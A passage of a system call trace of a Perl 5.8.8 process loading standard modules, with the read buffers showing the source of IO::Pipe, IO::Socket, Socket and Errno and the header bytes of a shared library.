1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
8463  07:23:33.138907 _llseek(6, 3425, [3425], SEEK_SET) = 0
8463  07:23:33.138925 _llseek(6, 0, [3425], SEEK_CUR) = 0
8463  07:23:33.138935 close(6)          = 0
8463  07:23:33.138959 stat64("/etc/perl/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138973 stat64("/etc/perl/IO/Socket.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138987 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139000 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139014 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139027 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139041 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139053 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139066 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139077 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139091 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.139103 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
8463  07:23:33.139124 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.139138 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.139150 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.139167 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
8463  07:23:33.140185 stat64("/etc/perl/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140201 stat64("/etc/perl/Socket.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140215 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140227 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140241 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140253 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140267 stat64("/usr/lib/perl5/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140279 stat64("/usr/lib/perl5/Socket.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140292 stat64("/usr/share/perl5/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140303 stat64("/usr/share/perl5/Socket.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140316 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.140328 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
8463  07:23:33.140349 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.140362 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.140373 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.140431 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
8463  07:23:33.140822 brk(0x8239000)    = 0x8239000
8463  07:23:33.141139 read(8, "", 4096) = 0
8463  07:23:33.141159 close(8)          = 0
8463  07:23:33.141244 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8463  07:23:33.141269 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8463  07:23:33.141295 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
8463  07:23:33.141309 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
8463  07:23:33.141438 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8463  07:23:33.141488 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d6c000
8463  07:23:33.141501 mmap2(0xb7d71000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d71000
8463  07:23:33.141517 close(8)          = 0
8463  07:23:33.142096 brk(0x825a000)    = 0x825a000
8463  07:23:33.142241 stat64("/etc/perl/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142258 stat64("/etc/perl/Errno.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142272 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142285 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142299 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142311 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142325 stat64("/usr/lib/perl5/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142337 stat64("/usr/lib/perl5/Errno.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142349 stat64("/usr/share/perl5/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142361 stat64("/usr/share/perl5/Errno.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142385 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.142425 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
8463  07:23:33.142463 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.142493 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.142504 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.142524 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
8463  07:23:33.143136 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my 